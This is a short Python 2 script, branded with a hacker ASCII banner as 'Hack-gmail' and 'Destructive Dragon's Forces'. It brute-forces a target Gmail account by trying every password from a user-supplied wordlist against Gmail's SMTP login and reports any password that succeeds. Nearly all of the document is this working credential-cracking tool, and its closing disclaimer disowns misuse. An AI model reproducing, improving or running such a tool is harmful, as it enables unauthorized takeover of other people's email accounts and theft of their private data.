import smtplib
from os import system
system ('clear')
def hell():
                    mawar = "\033[31;m1"
                    susu1 = "\033[37;1m"
                    hole1 = "\033[32;1m"

                    print hole1+"               Wait Hat Hacker"
                    print hole1+"    __  __           __                               _ __"
                    print hole1+"   / / / /___ ______/ /__      ____ _____ ___  ____ _(_) /"
                    print hole1+"  / /_/ / __ `/ ___/ //_/_____/ __ `/ __ `__ \/ __ `/ / / "
                    print hole1+" / __  / /_/ / /__/ ,< /_____/ /_/ / / / / / / /_/ / / /  "
                    print hole1+"/_/ /_/\__,_/\___/_/|_|      \__, /_/ /_/ /_/\__,_/_/_/   "
                    print hole1+"                            /____/                        "
                    print hole1+"................................"
                    print "|=======-<><><><><><><><><><><><>-=======|"
                    print "<=======    !Coded By DRAGON     =======>"
                    print "<======= !Tools Darwin Gmail  =======>"
                    print "<=======  !Destructive Dragon's Forces  =======>"
                    print "<=======  !Note We are not responsible for any misuse of yours  ======>"
                    print "|=======-<><><><><><><><><><><><>-=======|\n"

hell()
mawar = "\033[31;1m"

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!] Enter Email Target: ")
passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!] Password Detected :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Password Zonk!:" + password
                            break
                else:
                        print mawar+"-->[!] Password Zonk!:" + password


